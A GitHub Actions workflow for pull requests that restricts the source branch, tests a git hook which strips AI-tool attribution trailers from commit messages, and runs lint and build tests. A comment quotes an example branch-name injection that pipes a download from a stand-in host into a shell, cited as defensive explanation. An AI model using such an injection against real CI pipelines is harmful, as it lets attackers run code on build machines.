name: PR Gate

on:
  pull_request:
    branches: [master]

jobs:
  check-source-branch:
    runs-on: ubuntu-latest
    steps:
      # `github.head_ref` is a branch name the PR author controls, so interpolating it straight
      # into the script body is a template-injection sink — a branch called
      # `x"; curl evil.sh | sh; #` would run as shell. Passing it through the environment keeps
      # it data: the expression is expanded by the runner into an env var, and the shell only
      # ever sees `$HEAD_REF`.
      - name: Only allow PRs from develop
        env:
          HEAD_REF: ${{ github.head_ref }}
        run: |
          if [ "$HEAD_REF" != "develop" ]; then
            echo "::error::PRs to master are only allowed from the develop branch."
            exit 1
          fi
          echo "Source branch is develop — allowed."

  hook-check:
    runs-on: macos-latest
    needs: check-source-branch
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Install git hooks
        run: bash scripts/install-hooks.sh

      - name: Verify commit-msg hook strips AI trailers on macOS
        run: |
          # The sample carries one of every form the hook strips, INCLUDING a trailer
          # whose key is an invented AI-tool name (Claude-Session). That one is here
          # because it is the form that actually got through: it is not Made-with,
          # Co-authored-by, Generated-by or Written-by, so the fixed-name rules never
          # saw it, and neither did this check.
          printf '%s\n' \
            'fix(test): sample commit' \
            '' \
            'Body mentioning the openai client retry, which must survive.' \
            '' \
            'Co-Authored-By: Claude <noreply@anthropic.com>' \
            'Made-with: Cursor' \
            'Claude-Session: https://claude.ai/code/session_0000' \
            'Anthropic-Trace: abc123' \
            'Signed-off-by: ohmzi <ohmzi@users.noreply.github.com>' > "$RUNNER_TEMP/msg.txt"
          bash scripts/commit-msg "$RUNNER_TEMP/msg.txt"
          if grep -iE '^(made-with|generated-by|written-by):|^co-authored-by:.*(cursor|codex|copilot|chatgpt|claude|openai|anthropic)|^[a-z0-9-]*(cursor|codex|copilot|chatgpt|claude|openai|anthropic)[a-z0-9-]*:' "$RUNNER_TEMP/msg.txt"; then
            echo "::error::commit-msg hook failed to strip AI trailers on macOS."
            exit 1
          fi
          # The other half of the claim: stripping must not eat ordinary content. A body
          # line that merely mentions a tool, and a trailer that is not an AI trailer,
          # both have to still be there -- a hook that deleted them would pass the grep
          # above while quietly destroying commit messages.
          grep -q 'openai client retry' "$RUNNER_TEMP/msg.txt" || {
            echo "::error::commit-msg hook stripped a body line that merely mentions a tool."
            exit 1
          }
          grep -q '^Signed-off-by:' "$RUNNER_TEMP/msg.txt" || {
            echo "::error::commit-msg hook stripped a non-AI trailer."
            exit 1
          }
          echo "commit-msg hook stripped AI trailers correctly."

  lint-and-test:
    runs-on: ubuntu-latest
    needs: check-source-branch
    steps:
      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Set up Node.js
        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 20
          cache: npm
          cache-dependency-path: tday-web/package-lock.json

      - name: Check version mirrors
        run: node scripts/version.mjs check

      - name: Install frontend dependencies
        run: npm ci
        working-directory: tday-web

      - name: Lint frontend
        run: npm run lint
        working-directory: tday-web

      - name: Run frontend tests
        run: npm run test
        working-directory: tday-web
        env:
          TZ: UTC

      - name: Set up JDK 21
        uses: actions/setup-java@de7274f081f381c8f8158605e0321c36c376e2e6 # v6.0.1
        with:
          distribution: temurin
          java-version: 21

      - name: Run backend tests
        run: ./gradlew :tday-backend:test --no-daemon

      - name: Run shared module tests
        run: ./gradlew :shared:jvmTest --no-daemon

      - name: Verify guide content is not stale
        run: ./gradlew :shared:verifyGuideContent --no-daemon

      - name: Verify motion tokens are not stale
        run: ./gradlew :shared:verifyMotionTokens --no-daemon

      - name: Verify the list icon table is not stale
        run: ./gradlew :shared:verifyListIconTable --no-daemon
